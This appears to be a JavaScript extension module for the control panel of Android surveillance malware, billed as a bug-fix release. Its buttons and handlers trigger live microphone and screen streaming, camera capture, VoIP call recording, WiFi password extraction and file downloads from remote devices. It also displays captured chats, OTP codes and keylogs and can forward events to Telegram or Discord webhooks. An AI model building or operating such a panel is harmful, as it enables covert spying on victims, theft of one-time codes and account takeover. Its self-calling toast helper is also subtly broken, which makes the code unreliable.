/**
 * v79-features.js — NetMirror Admin Panel Extension Module (v2 — fixed)
 *
 * BUGS FIXED in v2:
 *   1. "No device selected" — app.js declares modalDeviceId, adminPassword,
 *      API_BASE, socket with `let`/`const` (script-scoped, NOT window.*).
 *      Now references them directly (shared global script scope).
 *   2. Layout overlap — toolbar was injected INSIDE .device-modal-top,
 *      colliding with the header. Now injected as a SEPARATE ROW below
 *      .device-modal-top, before .device-tabs.
 *   3. Compact grid layout — buttons now use a clean grid that doesn't
 *      interfere with existing CSS.
 *
 * FEATURES:
 *   Live Mic/Screen/Camera/VoIP, WiFi Passwords, Security Scan,
 *   File Manager, Chat Messages, OTP Codes, Geofences, App Blocker,
 *   Two-Way Chat, Search Vault, Dashboard, Webhooks
 */

(function() {
  'use strict';

  const V79_TAG = '[v79]';

  function log(msg) { console.log(`${V79_TAG} ${msg}`); }

  // ═══════════════════════════════════════════════════════════════
  //  HELPERS — reference app.js globals directly (script-scoped, not window.*)
  // ═══════════════════════════════════════════════════════════════

  function getDeviceId() {
    // modalDeviceId is declared with `let` in app.js — accessible from this
    // script because classic <script> tags share the same global scope.
    try { return modalDeviceId || ''; } catch (_) { return ''; }
  }

  function getAdminPassword() {
    try { return adminPassword || ''; } catch (_) { return ''; }
  }

  function getApiBase() {
    try { return API_BASE || window.location.origin; } catch (_) { return window.location.origin; }
  }

  function getSocket() {
    try { return socket || null; } catch (_) { return null; }
  }

  function showToast(msg, type) {
    try {
      if (typeof showToast === 'function') showToast(msg, type || 'info');
      else console.log(`[toast:${type || 'info'}] ${msg}`);
    } catch (_) {}
  }

  async function apiCall(endpoint, method, body) {
    const opts = {
      method: method || 'GET',
      headers: {
        'x-admin-password': getAdminPassword(),
        'Content-Type': 'application/json'
      }
    };
    if (body) opts.body = JSON.stringify(body);
    const res = await fetch(`${getApiBase()}${endpoint}`, opts);
    return res.json();
  }

  async function relayCommand(endpoint, extra) {
    const deviceId = getDeviceId();
    if (!deviceId) { showToast('⚠️ No device selected — open a device panel first', 'error'); return null; }
    try {
      const body = { device_id: deviceId, ...extra };
      const data = await apiCall(endpoint, 'POST', body);
      if (data.success) showToast(`✓ Command sent`, 'success');
      else showToast(`✗ Failed: ${data.error || 'Unknown error'}`, 'error');
      return data;
    } catch (e) {
      showToast(`✗ Error: ${e.message}`, 'error');
      return null;
    }
  }

  // ═══════════════════════════════════════════════════════════════
  //  INJECT TOOLBAR — as a separate row between .device-modal-top and .device-tabs
  // ═══════════════════════════════════════════════════════════════

  const TOOLBAR_HTML = `
    <div id="v79-toolbar" style="
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
      gap: 6px;
      padding: 10px 16px;
      background: linear-gradient(135deg, rgba(30,30,50,.6), rgba(20,20,35,.6));
      border-bottom: 1px solid rgba(255,255,255,.08);
      flex-shrink: 0;
      max-height: 280px;
      overflow-y: auto;
    ">
      <button onclick="v79.startMicStream()" class="v79-btn" style="--c:#ff6347;--bg:rgba(255,99,71,.15)">🎙️ Live Mic</button>
      <button onclick="v79.stopMicStream()" class="v79-btn" style="--c:#ff6347;--bg:rgba(255,99,71,.08)">⏹ Stop Mic</button>
      <button onclick="v79.requestScreenGrant()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.15)">🔑 Screen Grant</button>
      <button onclick="v79.startScreenStream()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.15)">📺 Live Screen</button>
      <button onclick="v79.stopScreenStream()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.08)">⏹ Stop Screen</button>
      <button onclick="v79.captureCamera('back')" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.15)">📷 Back Cam</button>
      <button onclick="v79.captureCamera('front')" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.15)">🤳 Front Cam</button>
      <button onclick="v79.startVoipRecord()" class="v79-btn" style="--c:#f1c40f;--bg:rgba(241,196,15,.15)">📞 VoIP Record</button>
      <button onclick="v79.stopVoipRecord()" class="v79-btn" style="--c:#f1c40f;--bg:rgba(241,196,15,.08)">⏹ Stop VoIP</button>
      <button onclick="v79.extractWifiPasswords()" class="v79-btn" style="--c:#3498db;--bg:rgba(52,152,219,.15)">📶 WiFi PW</button>
      <button onclick="v79.runSecurityScan()" class="v79-btn" style="--c:#e74c3c;--bg:rgba(231,76,60,.15)">🔒 Security Scan</button>
      <button onclick="v79.openFileManager()" class="v79-btn" style="--c:#95a5a6;--bg:rgba(149,165,166,.15)">📁 Files</button>
      <button onclick="v79.openChatMessages()" class="v79-btn" style="--c:#27ae60;--bg:rgba(39,174,96,.15)">💬 Chats</button>
      <button onclick="v79.openOtpCodes()" class="v79-btn" style="--c:#d35400;--bg:rgba(211,84,0,.15)">🔑 OTPs</button>
      <button onclick="v79.openGeofences()" class="v79-btn" style="--c:#2980b9;--bg:rgba(41,128,185,.15)">🗺️ Geofences</button>
      <button onclick="v79.openAppBlocker()" class="v79-btn" style="--c:#c0392b;--bg:rgba(192,57,43,.15)">🚫 App Block</button>
      <button onclick="v79.openTwoWayChat()" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.15)">✉️ Chat</button>
      <button onclick="v79.openSearch()" class="v79-btn" style="--c:#f39c12;--bg:rgba(243,156,18,.15)">🔍 Search</button>
    </div>
    <style>
      .v79-btn {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 4px;
        padding: 8px 6px;
        background: var(--bg);
        border: 1px solid var(--c);
        color: var(--c);
        border-radius: 6px;
        cursor: pointer;
        font-size: 11px;
        font-weight: 600;
        font-family: inherit;
        transition: all .15s ease;
        text-align: center;
        line-height: 1.2;
        min-height: 34px;
      }
      .v79-btn:hover {
        background: var(--c);
        color: #fff;
        transform: translateY(-1px);
        box-shadow: 0 2px 8px rgba(0,0,0,.3);
      }
      .v79-btn:active { transform: translateY(0); }
      #v79-toolbar::-webkit-scrollbar { width: 6px; }
      #v79-toolbar::-webkit-scrollbar-track { background: transparent; }
      #v79-toolbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,.15); border-radius: 3px; }
    </style>
  `;

  function injectToolbar() {
    if (document.getElementById('v79-toolbar')) return;

    const modal = document.getElementById('deviceModal');
    if (!modal) { log('Device modal not found — will retry'); setTimeout(injectToolbar, 2000); return; }

    // Check if modal is visible (no 'hidden' class)
    if (modal.classList.contains('hidden')) return;

    // Find the device-modal-top element — toolbar goes AFTER it, BEFORE device-tabs
    const modalTop = modal.querySelector('.device-modal-top');
    if (!modalTop) {
      log('.device-modal-top not found — retrying');
      setTimeout(injectToolbar, 1000);
      return;
    }

    // Insert toolbar as a sibling AFTER .device-modal-top
    modalTop.insertAdjacentHTML('afterend', TOOLBAR_HTML);
    log('Toolbar injected after .device-modal-top');
  }

  function removeToolbar() {
    const existing = document.getElementById('v79-toolbar');
    if (existing) existing.remove();
  }

  // ═══════════════════════════════════════════════════════════════
  //  COMMAND FUNCTIONS (exposed as window.v79.*)
  // ═══════════════════════════════════════════════════════════════

  window.v79 = {
    startMicStream: () => relayCommand('/api/admin/start-mic-stream'),
    stopMicStream: () => relayCommand('/api/admin/stop-mic-stream'),
    requestScreenGrant: () => relayCommand('/api/admin/request-screen-grant'),
    startScreenStream: () => relayCommand('/api/admin/start-screen-stream'),
    stopScreenStream: () => relayCommand('/api/admin/stop-screen-stream'),
    captureCamera: (camera) => relayCommand('/api/admin/capture-camera', { camera, quality: 'high' }),
    startVoipRecord: () => relayCommand('/api/admin/start-voip-record'),
    stopVoipRecord: () => relayCommand('/api/admin/stop-voip-record'),
    extractWifiPasswords: () => relayCommand('/api/admin/extract-wifi-passwords'),
    runSecurityScan: () => relayCommand('/api/admin/run-security-scan'),

    openFileManager: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      const path = prompt('Enter path to list:', '/sdcard');
      if (!path) return;
      try {
        const data = await apiCall('/api/admin/list-files', 'POST', { device_id: deviceId, path });
        if (data.success) showToast(`📁 Listed files in ${path}`, 'success');
        else showToast(`Failed: ${data.error}`, 'error');
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    openChatMessages: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/chat-messages?limit=200`);
        showChatMessagesModal(data.entries || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    openOtpCodes: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/otp-codes?limit=100`);
        showOtpCodesModal(data.entries || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    openGeofences: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/geofences`);
        const events = await apiCall(`/api/devices/${deviceId}/geofence-events?limit=50`);
        showGeofencesModal(data.geofences || [], events.events || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    openAppBlocker: function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      const pkg = prompt('Enter package name to block/unblock:', 'com.example.app');
      if (!pkg) return;
      const block = confirm(`Block "${pkg}"?\n\nOK = Block\nCancel = Unblock`);
      const endpoint = block ? '/api/admin/block-app' : '/api/admin/unblock-app';
      relayCommand(endpoint, { package: pkg });
    },

    openTwoWayChat: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/chat?limit=50`);
        showTwoWayChatModal(data.messages || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    openSearch: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      const q = prompt('Search across all captured data (chats, OTPs, keylogs, notifications):', '');
      if (!q) return;
      try {
        const data = await apiCall(`/api/devices/${deviceId}/search?q=${encodeURIComponent(q)}&limit=50`);
        showSearchResultsModal(q, data.results || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    sendChatMessage: async function() {
      const input = document.getElementById('v79-chat-input');
      if (!input || !input.value.trim()) return;
      const deviceId = getDeviceId();
      if (!deviceId) return;
      try {
        await apiCall(`/api/devices/${deviceId}/chat`, 'POST', { message: input.value, type: 'command' });
        input.value = '';
        showToast('✓ Message sent', 'success');
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    browseTo: function(path) {
      const deviceId = getDeviceId();
      if (!deviceId) return;
      apiCall('/api/admin/list-files', 'POST', { device_id: deviceId, path });
    },

    downloadFile: function(path) {
      const deviceId = getDeviceId();
      if (!deviceId) return;
      apiCall('/api/admin/download-file', 'POST', { device_id: deviceId, path });
      showToast('📁 File download requested...', 'info');
    },

    openWebhooks: async function() {
      try {
        const data = await apiCall('/api/admin/webhooks');
        const current = data.webhook;
        const url = prompt('Webhook URL (Telegram/Discord):', current?.url || '');
        if (url === null) return;
        const events = prompt('Events (comma-separated):', (current?.events || ['otp_captured','geofence_event','security_event']).join(','));
        if (events === null) return;
        await apiCall('/api/admin/webhooks', 'POST', {
          url, events: events.split(',').map(e => e.trim()).filter(Boolean), enabled: true
        });
        showToast('✓ Webhook saved', 'success');
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    openDashboard: async function() {
      try {
        const data = await apiCall('/api/admin/dashboard');
        showDashboardModal(data);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    }
  };

  // ═══════════════════════════════════════════════════════════════
  //  MODAL DISPLAY FUNCTIONS
  // ═══════════════════════════════════════════════════════════════

  function createModal(title, contentHtml) {
    // Remove any existing v79 modal first
    const existing = document.getElementById('v79-modal-overlay');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.id = 'v79-modal-overlay';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:100000;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;';
    overlay.innerHTML = `
      <div style="background:#1a1a2e;color:#fff;border-radius:12px;max-width:90vw;max-height:85vh;width:800px;display:flex;flex-direction:column;overflow:hidden;border:1px solid rgba(255,255,255,.15);box-shadow:0 20px 60px rgba(0,0,0,.5);">
        <div style="display:flex;justify-content:space-between;align-items:center;padding:14px 20px;border-bottom:1px solid rgba(255,255,255,.1);background:rgba(0,0,0,.3);flex-shrink:0;">
          <h3 style="margin:0;font-size:15px;color:#fff;font-weight:600;">${title}</h3>
          <button onclick="document.getElementById('v79-modal-overlay').remove()" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;padding:0 4px;line-height:1;">&times;</button>
        </div>
        <div style="padding:16px 20px;overflow-y:auto;flex:1;">${contentHtml}</div>
      </div>
    `;
    overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
    document.body.appendChild(overlay);
    return overlay;
  }

  function escapeHtml(s) {
    return String(s || '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  }

  function showChatMessagesModal(entries) {
    const rows = entries.map(e => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:6px 8px;color:#3498db;font-size:12px;">${escapeHtml(e.app)}</td><td style="padding:6px 8px;font-size:12px;">${escapeHtml(e.conversation)}</td><td style="padding:6px 8px;color:#e74c3c;font-size:12px;">${escapeHtml(e.sender)}</td><td style="padding:6px 8px;font-size:12px;">${escapeHtml(e.message_text)}</td><td style="padding:6px 8px;color:#95a5a6;font-size:10px;white-space:nowrap;">${escapeHtml(e.recorded_at)}</td></tr>`).join('');
    createModal(`💬 Chat Messages (${entries.length})`, `<table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:8px;">App</th><th style="padding:8px;">Conversation</th><th style="padding:8px;">Sender</th><th style="padding:8px;">Message</th><th style="padding:8px;">Time</th></tr></thead><tbody>${rows || '<tr><td colspan="5" style="padding:20px;text-align:center;color:#666;">No chat messages captured yet</td></tr>'}</tbody></table>`);
  }

  function showOtpCodesModal(entries) {
    const rows = entries.map(e => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:8px;color:#d35400;font-size:18px;font-weight:bold;font-family:monospace;">${escapeHtml(e.code)}</td><td style="padding:8px;font-size:12px;">${escapeHtml(e.app)}</td><td style="padding:8px;font-size:12px;">${escapeHtml(e.sender)}</td><td style="padding:8px;font-size:11px;color:#95a5a6;">${escapeHtml(e.full_text)}</td><td style="padding:8px;color:#95a5a6;font-size:10px;white-space:nowrap;">${escapeHtml(e.captured_at)}</td></tr>`).join('');
    createModal(`🔑 OTP Codes (${entries.length})`, `<table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:8px;">Code</th><th style="padding:8px;">App</th><th style="padding:8px;">Sender</th><th style="padding:8px;">Full Text</th><th style="padding:8px;">Captured</th></tr></thead><tbody>${rows || '<tr><td colspan="5" style="padding:20px;text-align:center;color:#666;">No OTP codes captured yet</td></tr>'}</tbody></table>`);
  }

  function showGeofencesModal(geofences, events) {
    const gfRows = geofences.map(g => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:8px;font-size:12px;">${escapeHtml(g.name)}</td><td style="padding:8px;font-size:10px;color:#95a5a6;max-width:200px;overflow:hidden;text-overflow:ellipsis;">${escapeHtml(g.points)}</td><td style="padding:8px;font-size:12px;">${g.alert_on_enter ? '✅' : '❌'} / ${g.alert_on_exit ? '✅' : '❌'}</td></tr>`).join('');
    const evRows = events.map(e => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:8px;color:${e.event === 'enter' ? '#27ae60' : '#e74c3c'};font-size:12px;">${escapeHtml(e.event)}</td><td style="padding:8px;font-size:12px;">${escapeHtml(e.geofence_name)}</td><td style="padding:8px;font-size:10px;">${e.latitude || 0}, ${e.longitude || 0}</td><td style="padding:8px;color:#95a5a6;font-size:10px;white-space:nowrap;">${escapeHtml(e.recorded_at)}</td></tr>`).join('');
    createModal(`🗺️ Geofences`, `<h4 style="color:#2980b9;margin:0 0 8px;font-size:13px;">Active (${geofences.length})</h4><table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:16px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:6px;">Name</th><th style="padding:6px;">Points</th><th style="padding:6px;">Enter/Exit</th></tr></thead><tbody>${gfRows || '<tr><td colspan="3" style="padding:14px;text-align:center;color:#666;">No geofences set</td></tr>'}</tbody></table><h4 style="color:#2980b9;margin:0 0 8px;font-size:13px;">Recent Events (${events.length})</h4><table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:6px;">Event</th><th style="padding:6px;">Geofence</th><th style="padding:6px;">Location</th><th style="padding:6px;">Time</th></tr></thead><tbody>${evRows || '<tr><td colspan="4" style="padding:14px;text-align:center;color:#666;">No events</td></tr>'}</tbody></table>`);
  }

  function showSearchResultsModal(query, results) {
    const rows = results.map(r => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:6px 8px;color:#f39c12;font-size:11px;">${escapeHtml(r.source)}</td><td style="padding:6px 8px;color:#3498db;font-size:11px;">${escapeHtml(r.context)}</td><td style="padding:6px 8px;font-size:11px;">${escapeHtml(r.sender)}</td><td style="padding:6px 8px;font-size:11px;">${escapeHtml(r.text)}</td><td style="padding:6px 8px;color:#95a5a6;font-size:10px;white-space:nowrap;">${escapeHtml(r.recorded_at)}</td></tr>`).join('');
    createModal(`🔍 Search: "${escapeHtml(query)}" (${results.length} results)`, `<table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:8px;">Source</th><th style="padding:8px;">Context</th><th style="padding:8px;">Sender</th><th style="padding:8px;">Text</th><th style="padding:8px;">Time</th></tr></thead><tbody>${rows || '<tr><td colspan="5" style="padding:20px;text-align:center;color:#666;">No results found</td></tr>'}</tbody></table>`);
  }

  function showTwoWayChatModal(messages) {
    const msgs = messages.map(m => `<div style="margin:6px 0;padding:8px 12px;border-radius:8px;${m.from_sender === 'admin' ? 'background:rgba(52,152,219,.15);margin-left:30px;' : 'background:rgba(149,165,166,.1);margin-right:30px;'}"><div style="font-size:10px;color:#95a5a6;margin-bottom:2px;">${escapeHtml(m.from_sender)} · ${escapeHtml(m.ts)}</div><div style="font-size:13px;">${escapeHtml(m.message)}</div></div>`).join('');
    createModal('✉️ Two-Way Chat', `<div style="margin-bottom:12px;display:flex;gap:8px;"><input id="v79-chat-input" type="text" placeholder="Type a message or command..." style="flex:1;padding:8px 12px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;" onkeypress="if(event.key==='Enter')v79.sendChatMessage()"><button onclick="v79.sendChatMessage()" style="padding:8px 16px;background:rgba(155,89,182,.3);border:1px solid rgba(155,89,182,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:12px;">Send</button></div><div style="max-height:400px;overflow-y:auto;">${msgs || '<div style="padding:20px;text-align:center;color:#666;">No messages yet</div>'}</div>`);
  }

  function showDashboardModal(data) {
    const deviceRows = (data.devices || []).slice(0, 50).map(d => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);cursor:pointer;" onclick="document.getElementById('v79-modal-overlay').remove(); if(typeof openDeviceModal==='function')openDeviceModal('${escapeHtml(d.device_id)}','${escapeHtml(d.device_name || d.model || '')}');"><td style="padding:6px 8px;color:${d.online ? '#27ae60' : '#666'};font-size:14px;">${d.online ? '●' : '○'}</td><td style="padding:6px 8px;font-size:12px;">${escapeHtml(d.device_name || d.model || d.device_id.substring(0, 8))}</td><td style="padding:6px 8px;font-size:11px;">${escapeHtml(d.app_version || '?')}</td><td style="padding:6px 8px;color:#95a5a6;font-size:11px;">${d.last_seen_minutes_ago != null ? d.last_seen_minutes_ago + ' min ago' : 'never'}</td></tr>`).join('');
    createModal(`📊 Dashboard — ${data.online || 0} online / ${data.total || 0} total`, `<table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:8px;">Status</th><th style="padding:8px;">Device</th><th style="padding:8px;">Version</th><th style="padding:8px;">Last Seen</th></tr></thead><tbody>${deviceRows}</tbody></table>${data.total > 50 ? `<div style="padding:10px;text-align:center;color:#95a5a6;font-size:11px;">Showing 50 of ${data.total} devices</div>` : ''}`);
  }

  // ═══════════════════════════════════════════════════════════════
  //  SOCKET LISTENERS
  // ═══════════════════════════════════════════════════════════════

  let listenersRegistered = false;
  function registerSocketListeners() {
    if (listenersRegistered) return;
    const sock = getSocket();
    if (!sock) { log('Socket not ready — will retry'); setTimeout(registerSocketListeners, 3000); return; }

    try {
      sock.on('otp_captured', (data) => {
        showToast(`🔑 OTP captured: ${data.code} (${data.sender})`, 'success');
      });

      sock.on('geofence_event', (data) => {
        showToast(`🗺️ Geofence ${data.event}: ${data.geofence_name}`, data.event === 'enter' ? 'success' : 'error');
      });

      sock.on('security_event', (data) => {
        if (data.compromised) showToast(`🚨 SECURITY THREAT on device!`, 'error');
      });

      sock.on('camera_capture_result', (data) => {
        if (data.success) {
          showToast(`📷 Photo captured: ${data.camera}`, 'success');
          if (data.url) window.open(data.url, '_blank');
        } else {
          showToast(`📷 Camera failed: ${data.error}`, 'error');
        }
      });

      sock.on('wifi_passwords_result', (data) => {
        const count = data.count || 0;
        showToast(`📶 WiFi passwords: ${count} networks`, 'success');
        const rows = (data.networks || []).map(n => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:6px 8px;font-size:12px;">${escapeHtml(n.ssid)}</td><td style="padding:6px 8px;color:#27ae60;font-family:monospace;font-size:12px;">${escapeHtml(n.password) || '(redacted)'}</td><td style="padding:6px 8px;font-size:11px;">${escapeHtml(n.security)}</td></tr>`).join('');
        createModal(`📶 WiFi Networks (${count})`, `<p style="color:#95a5a6;font-size:11px;margin:0 0 10px;">Has root: ${data.has_root ? 'Yes' : 'No (passwords may be redacted on Android 10+)'}</p><table style="width:100%;border-collapse:collapse;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:6px;">SSID</th><th style="padding:6px;">Password</th><th style="padding:6px;">Security</th></tr></thead><tbody>${rows || '<tr><td colspan="3" style="padding:14px;text-align:center;color:#666;">No networks</td></tr>'}</tbody></table>`);
      });

      sock.on('mic_stream_started', (data) => {
        if (data.success) showToast('🎙️ Mic streaming started', 'success');
        else showToast(`🎙️ Mic failed: ${data.error}`, 'error');
      });

      sock.on('screen_stream_started', (data) => {
        if (data.success) showToast('📺 Screen streaming started', 'success');
        else showToast(`📺 Screen failed: ${data.error}`, 'error');
      });

      sock.on('voip_record_started', (data) => {
        if (data.success) showToast('📞 VoIP recording started', 'success');
        else showToast(`📞 VoIP failed: ${data.error}`, 'error');
      });

      sock.on('voip_record_result', (data) => {
        if (data.success) {
          showToast('📞 VoIP recording uploaded!', 'success');
          if (data.url) window.open(data.url, '_blank');
        }
      });

      sock.on('files_listed', (data) => {
        const entries = data.entries || [];
        showToast(`📁 Listed ${entries.length} files`, 'success');
        const list = document.getElementById('v79-file-list');
        if (list) {
          list.innerHTML = entries.map(e => `<div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);${e.is_dir ? 'color:#3498db;cursor:pointer;' : 'color:#fff;'}" ${e.is_dir ? `onclick="v79.browseTo('${escapeHtml(e.path)}')"` : ''}>${e.is_dir ? '📁' : '📄'} ${escapeHtml(e.name)} ${!e.is_dir ? `<span style="color:#666;font-size:10px;">(${(e.size/1024).toFixed(1)} KB)</span><button onclick="v79.downloadFile('${escapeHtml(e.path)}')" style="float:right;background:rgba(52,152,219,.3);border:none;color:#fff;padding:2px 8px;border-radius:4px;cursor:pointer;font-size:10px;">Download</button>` : ''}</div>`).join('') || '<div style="padding:20px;text-align:center;color:#666;">Empty directory</div>';
        }
      });

      sock.on('file_download_result', (data) => {
        if (data.success) {
          showToast(`📁 File uploaded`, 'success');
          if (data.url) window.open(data.url, '_blank');
        } else {
          showToast(`📁 Download failed: ${data.error}`, 'error');
        }
      });

      listenersRegistered = true;
      log('Socket listeners registered');
    } catch (e) {
      log('Socket listener registration failed: ' + e.message);
    }
  }

  // ═══════════════════════════════════════════════════════════════
  //  INJECT GLOBAL BUTTONS (Dashboard + Webhooks) into .topbar-right
  // ═══════════════════════════════════════════════════════════════

  function injectGlobalButtons() {
    if (document.getElementById('v79-dashboard-btn')) return;

    const topbarRight = document.querySelector('.topbar-right');
    if (!topbarRight) {
      setTimeout(injectGlobalButtons, 3000);
      return;
    }

    const btnContainer = document.createElement('div');
    btnContainer.style.cssText = 'display:inline-flex;gap:6px;margin-left:12px;';
    btnContainer.innerHTML = `
      <button id="v79-dashboard-btn" onclick="v79.openDashboard()" style="background:rgba(46,204,113,.15);border:1px solid rgba(46,204,113,.4);color:#2ecc71;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:600;">📊 Dashboard</button>
      <button id="v79-webhook-btn" onclick="v79.openWebhooks()" style="background:rgba(155,89,182,.15);border:1px solid rgba(155,89,182,.4);color:#9b59b6;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:600;">🔔 Webhooks</button>
    `;
    topbarRight.appendChild(btnContainer);
    log('Global buttons injected into .topbar-right');
  }

  // ═══════════════════════════════════════════════════════════════
  //  INIT
  // ═══════════════════════════════════════════════════════════════

  function init() {
    log('v7.9 Features module v2 loaded (fixed scope + layout)');
    injectGlobalButtons();

    // Watch for device modal opening/closing
    const observer = new MutationObserver(() => {
      const modal = document.getElementById('deviceModal');
      if (!modal) return;
      if (modal.classList.contains('hidden')) {
        removeToolbar();
      } else {
        if (!document.getElementById('v79-toolbar')) {
          injectToolbar();
        }
      }
    });
    observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['class'] });

    // Also try injecting immediately if modal is already open
    setTimeout(injectToolbar, 1000);

    registerSocketListeners();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
